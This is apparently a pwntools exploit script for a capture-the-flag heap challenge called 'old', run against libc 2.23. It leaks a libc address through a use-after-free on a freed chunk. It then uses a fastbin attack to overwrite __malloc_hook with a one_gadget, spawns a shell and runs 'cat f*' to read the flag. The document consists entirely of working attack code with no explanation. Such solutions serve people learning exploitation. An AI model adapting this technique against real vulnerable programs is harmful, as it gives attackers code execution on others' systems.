#!/bin/python3

from pwn import *


e = ELF("./old")
l = ELF("./libc-2.23.so")

p = process(e.path, env={'LD_PRELOAD':l.path})
# p = remote("pwn.glacierctf.com", 13377)


def add(idx, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx:", str(idx))
    p.sendlineafter(b"size:", str(size))
    return idx

def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx:", str(idx))

def write(idx, contents):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx:", str(idx))
    p.sendlineafter(b"contents: ", contents)

def view(idx):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx:", str(idx))

big = add(0, 1056)
a = add(1, 0x68)

delete(big)
view(big)

# leak
p.recvuntil(b"data: ")
leak = u64(p.recvuntil(b"\x7f").ljust(8, b"\x00"))
log.info("leak @ [0x%x]" % leak)
l.address = leak - 0x3c4b78
log.info("libc @ [0x%x]" % l.address)

# exploit
delete(a)

write(a, p64(l.sym.__malloc_hook - 35))
_ = add(2, 0x68)
mhook = add(3, 0x68)
write(mhook, b"a"*19 + p64(l.address + 0x4527a))
_ = add(5, 10)
p.sendline(b"cat f*")
p.interactive()
